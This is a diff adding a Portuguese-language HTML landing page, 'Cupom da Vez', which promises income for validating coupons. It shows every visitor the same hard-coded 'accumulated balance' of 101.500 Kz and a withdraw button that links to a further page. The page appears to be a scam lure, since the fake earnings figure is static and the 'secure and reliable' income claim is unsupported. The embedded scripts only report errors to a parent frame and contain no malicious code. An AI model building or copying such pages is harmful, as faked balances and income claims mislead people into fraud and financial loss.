@@ -1,0 +1,192 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/vite.svg">
+    <meta name="generator" content="Hostinger Horizons">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cupom da Vez - Ganhe Dinheiro com Cupons</title>
+    <link rel="stylesheet" href="index-9d423ca4.css">
+    <script type="module">
+        window.onerror = (message, source, lineno, colno, errorObj) => {
+            const errorDetails = errorObj ? JSON.stringify({
+                name: errorObj.name,
+                message: errorObj.message,
+                stack: errorObj.stack,
+                source,
+                lineno,
+                colno,
+            }) : null;
+
+            window.parent.postMessage({
+                type: 'horizons-runtime-error',
+                message,
+                error: errorDetails
+            }, '*');
+        };
+    </script>
+    <script type="module">
+        const observer = new MutationObserver((mutations) => {
+            for (const mutation of mutations) {
+                for (const addedNode of mutation.addedNodes) {
+                    if (
+                        addedNode.nodeType === Node.ELEMENT_NODE &&
+                        (
+                            addedNode.tagName?.toLowerCase() === 'vite-error-overlay' ||
+                            addedNode.classList?.contains('backdrop')
+                        )
+                    ) {
+                        handleViteOverlay(addedNode);
+                    }
+                }
+            }
+        });
+
+        observer.observe(document.documentElement, {
+            childList: true,
+            subtree: true
+        });
+
+        function handleViteOverlay(node) {
+            if (!node.shadowRoot) {
+                return;
+            }
+
+            const backdrop = node.shadowRoot.querySelector('.backdrop');
+
+            if (backdrop) {
+                const overlayHtml = backdrop.outerHTML;
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(overlayHtml, 'text/html');
+                const messageBodyElement = doc.querySelector('.message-body');
+                const fileElement = doc.querySelector('.file');
+                const messageText = messageBodyElement ? messageBodyElement.textContent.trim() : '';
+                const fileText = fileElement ? fileElement.textContent.trim() : '';
+                const error = messageText + (fileText ? ' File:' + fileText : '');
+
+                window.parent.postMessage({
+                    type: 'horizons-vite-error',
+                    error,
+                }, '*');
+            }
+        }
+    </script>
+    <script type="module">
+        const originalConsoleError = console.error;
+        console.error = function (...args) {
+            originalConsoleError.apply(console, args);
+
+            let errorString = '';
+
+            for (let i = 0; i < args.length; i++) {
+                const arg = args[i];
+                if (arg instanceof Error) {
+                    errorString = arg.stack || `${arg.name}: ${arg.message}`;
+                    break;
+                }
+            }
+
+            if (!errorString) {
+                errorString = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : String(arg)).join(' ');
+            }
+
+            window.parent.postMessage({
+                type: 'horizons-console-error',
+                error: errorString
+            }, '*');
+        };
+    </script>
+    <script type="module">
+        const originalFetch = window.fetch;
+
+        window.fetch = function (...args) {
+            const url = args[0] instanceof Request ? args[0].url : args[0];
+
+            // Skip WebSocket URLs
+            if (url.startsWith('ws:') || url.startsWith('wss:')) {
+                return originalFetch.apply(this, args);
+            }
+
+            return originalFetch.apply(this, args)
+                .then(async response => {
+                    const contentType = response.headers.get('Content-Type') || '';
+
+                    // Exclude HTML document responses
+                    const isDocumentResponse =
+                        contentType.includes('text/html') ||
+                        contentType.includes('application/xhtml+xml');
+
+                    if (!response.ok && !isDocumentResponse) {
+                        const responseClone = response.clone();
+                        const errorFromRes = await responseClone.text();
+                        const requestUrl = response.url;
+                        console.error(`Fetch error from ${requestUrl}: ${errorFromRes}`);
+                    }
+
+                    return response;
+                })
+                .catch(error => {
+                    if (!url.match(/.html?$/i)) {
+                        console.error(error);
+                    }
+
+                    throw error;
+                });
+        };
+    </script>
+    <meta name="description"
+        content="Participe do Cupom da Vez e ganhe dinheiro validando cupons de desconto. Sistema seguro e confiável para renda extra."
+        data-react-helmet="true">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" data-react-helmet="true">
+    <meta name="theme-color" content="#ffd700" data-react-helmet="true">
+</head>
+
+<body>
+    <div id="root">
+        <div class="mobile-container">
+            <div class="min-h-screen bg-white flex flex-col">
+                <div class="text-center py-8 px-6" style="opacity: 1; transform: none;">
+                    <div class="flex items-center justify-center mb-6">
+                        <h1 class="text-3xl font-black text-black">cupom</h1>
+                        <div class="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center ml-1"><span
+                                class="text-black font-bold text-sm">$</span></div>
+                        <div class="ml-2"><span class="text-sm font-medium text-gray-600 block leading-tight">DA
+                                VEZ</span></div>
+                    </div>
+                </div>
+                <div class="flex-1 px-6 flex flex-col justify-center" style="opacity: 1; transform: none;">
+                    <div class="text-center mb-8">
+                        <h2 class="text-3xl font-bold text-gray-900 mb-4">Limite Diário Atingido!</h2>
+                        <p class="text-gray-600 mb-6">Você atingiu o limite de cupões diários.</p>
+                        <div class="bg-green-50 border-2 border-green-200 rounded-2xl p-6 mb-8"
+                            style="opacity: 1; transform: none;">
+                            <p class="text-gray-600 mb-2">Saldo Total Acumulado:</p>
+                            <p class="text-4xl font-bold text-green-600 glow-effect">101.500 Kz</p>
+                        </div>
+                        <div class="flex items-center justify-center mb-8"><span class="mr-2">⬇️</span>
+                            <p class="text-blue-600 font-medium">Realize o seu saque abaixo</p><span
+                                class="ml-2">⬇️</span>
+                        </div>
+                    </div>
+                    <div tabindex="0" style="opacity: 1; transform: none;"><button onclick="bazar()"
+                            class="inline-flex items-center justify-center ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-4 px-6 rounded-2xl text-lg shadow-lg button-hover pulse-animation"
+                            id="75931807-5ebd-58fc-baa5-2f8d5b4186af">REALIZAR SAQUE</button></div>
+                </div>
+            </div>
+        </div>
+        <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
+            <ol tabindex="-1"
+                class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]">
+            </ol>
+        </div>
+    </div>
+</body>
+<script>
+    function bazar() {
+
+        // Código correto
+        window.location.href = "realizar_saques.html";
+
+    }</script>
+
+</html>
